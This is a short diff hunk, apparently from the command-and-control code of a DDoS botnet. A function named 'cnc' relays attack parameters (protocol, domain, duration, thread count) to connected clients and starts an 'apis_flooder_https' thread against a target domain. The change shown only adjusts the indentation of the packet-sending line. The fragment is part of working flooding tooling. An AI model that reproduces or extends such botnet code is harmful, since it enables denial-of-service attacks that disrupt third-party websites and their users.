@@ -353,7 +353,7 @@ def cnc(client_socket,address,username):
     threader = commands[4]
     meth_http = commands[5]
     for a in methods_icon.split('\n'):
-      send_packet(client_socket%(f'{protocol}://{domain}',str(times),str(threader),COM),ex=True)
+     send_packet(client_socket%(f'{protocol}://{domain}',str(times),str(threader),COM),ex=True)
      time.sleep(0.1)
     threading.Thread(target=apis_flooder_https,args=(protocol,domain,times,threader,COM,meth_http)).start()
    else:
